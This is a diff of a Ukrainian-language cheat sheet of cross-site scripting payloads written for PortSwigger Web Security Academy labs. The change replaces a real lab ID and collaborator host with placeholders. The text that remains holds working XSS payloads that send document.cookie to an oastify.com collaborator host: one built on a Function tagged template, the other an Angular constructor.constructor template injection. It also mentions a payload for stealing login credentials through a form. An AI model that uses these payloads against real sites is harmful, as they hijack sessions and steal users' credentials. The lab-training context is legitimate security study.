@@ -29,7 +29,7 @@ location="https://YOUR-LAB-ID.web-security-academy.net/?SearchTerm=%22%2Beval(at
 >адаптована версія із використанням Function`X$, лише передати script у exploit server для отримання cookies
 ```
 <script>
-location="https://0aa7008c03742cfb80f9085a003f00c4.web-security-academy.net/?find=%22-Function`X${'document.location=%22https://pf8ftts7s6lrxx4czzvyip2f86ex2oqd.oastify.com/%22%2Bdocument.cookie'}```-%22"
+location="https://YOUR-LAB-ID.web-security-academy.net/?find=%22-Function`X${'document.location=%22https://burp.oastify.com/%22%2Bdocument.cookie'}```-%22"
 </script>
 ```
 **XSS+cookie**
@@ -108,7 +108,6 @@ https://xxxxxx.net/?'accesskey='x'onclick='document.location="https://your-colla
 constructor.constructor в Angular дає доступ до глобальної функції Function, яка дозволяє створювати і виконувати JavaScript-код у шаблоні. 
 ```
 {{constructor.constructor('document.location="http://burp.oastify.com?c="+document.cookie')()}}
-
 ```
 **XSS+input+cookie**
 >ін'єкція для викрадення паролю і логіна користувача, який скористається формою для авторизації. Звісно, сторінка повинна мати вразливість до XSS.
